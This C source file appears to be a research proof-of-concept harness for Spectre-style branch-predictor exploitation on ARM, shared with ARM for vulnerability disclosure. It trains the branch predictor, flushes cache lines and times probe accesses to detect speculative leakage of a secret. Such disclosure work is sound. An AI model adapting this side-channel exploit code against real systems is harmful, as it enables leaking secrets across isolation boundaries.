/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, June 5th 2025
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <linux/types.h>
#include "jit_utils.h"
#include "c_snippets.h"
#include "sc_utils.h"
#include "arch_defines.h"
#include "tests.h"
#include "args.h"

void init_env();
void print_result();
void print_cache_latency();
void free_env();

__attribute__((aligned(4096)))
uint64_t **res_cycles;
uint64_t mem_threshold;

void goto_chain(branch_chain_t br_chain, uint64_t *bh_args, void **ib_ptr_p, int nr_cond_bh, void *frbuf, void *secret_p, uint64_t ex_argc, char **ex_argv)
{
    // Populate BHB with for loop
    for (int i = 0; i < nr_cond_bh; i++)
        NOP(8);
    // Populate PHR with direct/indirect branches and train the BPU
    br_chain(bh_args, 0, ex_argv, ib_ptr_p, frbuf, secret_p);
}

#define UNPACK_BR_CHAIN_ARGS(x) \
    branch_chain_t bh_tramp = (*x->bh_tramp_p)->jit_mem->call_entry; \
    uint64_t *bh_args = *(x->bh_args_p); \
    uint64_t nr_for_bh = *(x->nr_bh_for_p); \
    char *_frbuf = *(x->frbuf_p); \
    char *secret_p = x->secret_p; \
    uint64_t ex_argc = x->ex_argc; \
    char **ex_argv = x->ex_argv; 
void do_spectre_test(test_obj_t test_specs, int idx_test)
{
    uint64_t nr_repeat = test_specs.nr_repeat;
    uint64_t nr_train_passes = test_specs.nr_train_passes;
    uint64_t nr_train_chains = test_specs.nr_train_chains;
    bh_chain_params_t **train_chains = test_specs.train_chains;
    bh_chain_params_t *spec_chain = test_specs.spec_chain;

    for (int rept_test = 0; rept_test < nr_repeat; rept_test++)
    {
        if (test_specs.pre_test) test_specs.pre_test(idx_test, rept_test);
        for (int rept_train = 0; rept_train < nr_train_passes; rept_train++)
        {
            // Warm-up the BPU
            if (test_specs.pre_train) test_specs.pre_train(idx_test, rept_test, rept_train);
            // Train the BPU with desired records
            for (int idx_train = 0; idx_train < nr_train_chains; idx_train++)
            {
                if (test_specs.in_train) test_specs.in_train(idx_test, rept_test, rept_train, idx_train);
                bh_chain_params_t *current = train_chains[idx_train];
                void **ib_ptr_p = current->ib_ptr_p;
                void *ib_target = current->ib_target;
                *ib_ptr_p = ib_target;
                
                UNPACK_BR_CHAIN_ARGS(current);
                goto_chain(bh_tramp, bh_args, ib_ptr_p, nr_for_bh, _frbuf, secret_p, ex_argc, ex_argv);
            }
        }

        // Massage the BPU to a desired state
        if (test_specs.pre_spec) test_specs.pre_spec(idx_test, rept_test);
        void **ib_ptr_p = spec_chain->ib_ptr_p;
        void *ib_target = spec_chain->ib_target;
        *ib_ptr_p = ib_target;

        // Run the spec_chain and see if we can see the desired mis-speculation
        UNPACK_BR_CHAIN_ARGS(spec_chain);

        FLUSH_DCACHE(ib_ptr_p);
        for (int i = 0; i < test_specs.nr_dc_flush; i++)
            FLUSH_DCACHE(test_specs.dc_flush[i]);
        for (int i = 0; i < test_specs.nr_probes; i++)
            FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, test_specs.probes_p[i]));
        OPS_BARRIER(0x10);

        goto_chain(bh_tramp, bh_args, ib_ptr_p, nr_for_bh, _frbuf, secret_p, ex_argc, ex_argv);
        // Decode side channel to see if we have made it!
        OPS_BARRIER(0x10);
        if (test_specs.post_spec) test_specs.post_spec(idx_test, rept_test);
        for (int i = 0; i < test_specs.nr_probes; i++)
            res_cycles[idx_test][rept_test * test_specs.nr_probes + i] = mem_access_time(SC_ENCODE_ADDR(_frbuf, test_specs.probes_p[i]));
    }
}

int main(int argc, char **argv)
{
    parse_args(argc, argv);
    init_env();
    while (next_run())
    {
        init_test();
        for (int i=0; i<run.nr_tests; i++)
            do_spectre_test(*run.tests[i], i);
        print_result();
        free_test();
    }
    free_env();
    return 0;
}

void init_res_buffers()
{
    init_frbuf(256, SIZE_CACHE_STRIDE);
    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secrets[0]), NR_TEST_ITER);
    mem_threshold = mem_fast + (mem_slow - mem_fast)*0.2;
    print_cache_latency();
    res_cycles = malloc(run.nr_tests * sizeof(uint64_t));
    for (int i = 0; i < run.nr_tests; i++)
        res_cycles[i] = malloc(run.tests[i]->nr_repeat * run.tests[i]->nr_probes * sizeof(uint64_t));
}

void init_trampolines()
{
    tramp_ret = prep_trampoline(&jit_ret_obj, &jit_nop_obj, NULL, 16, 0, BASE_RET_MEM, 1ull<<args.tramp_bits);
    tramp_br = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, NULL, 0, 0, BASE_BHB_POPULATE, 1ull<<args.tramp_bits);
    tramp_bcond = prep_trampoline(&jit_bcond_and_inc_idx_obj, NULL, &jit_br_and_inc_idx_obj, 0, 0, NULL, args.nr_cond_bh *(jit_bcond_and_inc_idx_obj.end - jit_bcond_and_inc_idx_obj.entry));
    tramp_victim = prep_aligned_snippet(run.bp_snippet, (void *)args.victim_snippet_base, 0);
}

void init_env()
{
    init_res_buffers();
    init_trampolines();
}

void print_result()
{
    for (int i=0; i<run.nr_tests; i++)
    {
        uint64_t sum = 0;
        printf("--- Test %d: %s\n", i, run.tests[i]->description);
        printf("Probe access latency (average of %d tests):", run.tests[i]->nr_repeat);
        for (int i_probe = 0; i_probe < run.tests[i]->nr_probes; i_probe++)
        {
            sum = 0;
            for (int round = 0; round < run.tests[i]->nr_repeat; round++)
                sum += res_cycles[i][round * run.tests[i]->nr_probes + i_probe];
            printf(" %d", sum / run.tests[i]->nr_repeat);
        }
        printf("\n");
    }
}

void print_cache_latency()
{
    printf("Memory access latency (average of %d tests): \n", NR_TEST_ITER);
    printf("slow access: %d\n", mem_slow);
    printf("fast access: %d\n", mem_fast);
    printf("threshold: %d\n", mem_threshold);
    printf("\n");
}

void free_res_buffers()
{
    free_frbuf();
    for (int i = 0; i < run.nr_tests; i++) free(res_cycles[i]);
    free(res_cycles);
}

void free_trampolines()
{
    free_trampoline(tramp_ret);
    free_trampoline(tramp_br);
    free_trampoline(tramp_bcond);
    free_trampoline(tramp_victim);
}

void free_env()
{
    free_res_buffers();
    free_trampolines();
}
